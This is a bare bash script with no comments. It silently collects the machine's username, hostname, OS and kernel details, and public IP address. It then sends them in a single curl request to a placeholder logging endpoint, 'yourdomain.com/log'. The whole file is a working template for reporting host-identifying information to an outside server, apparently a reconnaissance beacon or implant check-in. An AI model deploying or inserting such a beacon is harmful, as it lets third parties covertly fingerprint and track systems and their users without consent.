#!/bin/bash

USER=$(whoami)
HOST=$(hostname)
OS=$(uname -a)
IP=$(curl -s ifconfig.me)

curl "https://yourdomain.com/log?u=$USER&h=$HOST&os=$OS&ip=$IP"
